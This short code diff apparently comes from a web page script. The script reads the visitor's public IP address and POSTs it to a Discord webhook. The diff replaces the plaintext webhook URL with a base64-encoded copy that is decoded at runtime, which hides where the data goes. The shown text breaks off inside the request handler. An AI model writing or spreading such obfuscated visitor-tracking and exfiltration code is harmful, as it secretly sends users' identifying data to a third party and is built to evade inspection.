@@ -1,6 +1,7 @@
 $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
+    var b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODM0MTQ5MTU4MDIxNDk2ODkyLzlXQ0F3cUZFNHFWZ1M3clRVZzdBT2pYeFRfeDBPTFY3dHZoeldHUnh3RXZaaGpxXzhPYnRFWW1pS0E1VjZZR3k1MDB2";
     var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/834149158021496892/9WCAwqFE4qVgS7rTUg7AOjXxT_x0OLV7tvhzWGRxwEvZhjq_8ObtEYmiKA5V6YGy500v");
+    request.open("POST", atob(b64));
     request.setRequestHeader('Content-type', 'application/json');
 
     request.onloadend = () => {
